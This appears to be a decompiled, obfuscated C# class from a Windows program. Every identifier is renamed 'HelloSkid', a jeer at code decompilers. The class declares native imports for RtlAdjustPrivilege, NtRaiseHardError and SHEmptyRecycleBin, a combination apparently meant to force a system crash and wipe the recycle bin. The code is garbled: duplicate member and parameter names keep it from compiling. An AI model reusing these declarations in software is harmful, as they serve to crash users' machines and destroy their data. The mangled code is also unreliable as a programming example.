using System;
using System.Runtime.InteropServices;

public class GClass0
{
	public enum GEnum0
	{
		HelloSkid = 1,
		HelloSkid = 1,
		HelloSkid = 4
	}

	[DllImport("ntdll.dll")]
	public static extern IntPtr RtlAdjustPrivilege(int HelloSkid, bool HelloSkid, bool HelloSkid, out bool HelloSkid);

	[DllImport("ntdll.dll")]
	public static extern IntPtr NtRaiseHardError(uint HelloSkid, uint HelloSkid, uint HelloSkid, IntPtr HelloSkid, uint HelloSkid, out uint HelloSkid);

	[DllImport("Shell32.dll", CharSet = CharSet.Unicode)]
	public static extern uint SHEmptyRecycleBin(IntPtr HelloSkid, string HelloSkid, int HelloSkid);

	public extern GClass0();
}
